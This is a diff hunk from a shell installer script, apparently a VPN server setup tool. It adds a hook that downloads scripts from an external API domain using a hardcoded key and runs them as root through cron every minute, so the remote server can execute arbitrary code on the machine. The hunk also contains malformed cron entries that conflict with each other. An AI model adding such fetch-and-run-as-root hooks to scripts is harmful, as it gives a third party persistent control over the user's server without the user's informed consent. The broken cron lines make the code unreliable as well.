@@ -780,6 +780,41 @@ cat <<EOF152> /var/www/html/index.html
 EOF152
 
 
+
+#API Details
+VPN_Owner='Tknetwork';
+API_LINK='https://5ginternetvip.com/api/authentication';
+API_KEY='Tknetwork';
+
+cat <<EOF >/home/authentication.sh
+#!/bin/bash
+SHELL=/bin/bash
+PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
+wget -O /home/active.sh "$API_LINK/active.php?key=$API_KEY"
+sleep 5
+wget -O /home/inactive.sh "$API_LINK/inactive.php?key=$API_KEY"
+sleep 5
+wget -O /home/deleted.sh "$API_LINK/deleted.php?key=$API_KEY"
+sleep 15
+bash /home/active.sh
+sleep 15
+bash /home/inactive.sh
+sleep 15
+bash /home/deleted.sh
+EOF
+
+echo -e "* *\t* * *\troot\tsudo bash /home/authentication.sh" >> "/etc/cron.d/account"
+
+echo "* * * * * /bin/bash  /home/active.sh >/dev/null 2>&1" | crontab -
+
+echo "* * * * * /bin/bash  /home/authentication.sh >/dev/null 2>&1" | crontab -
+
+
+
+sh active.sh | tee -a  /home/active.sh
+
+
+
 }
 
 display_menu () {
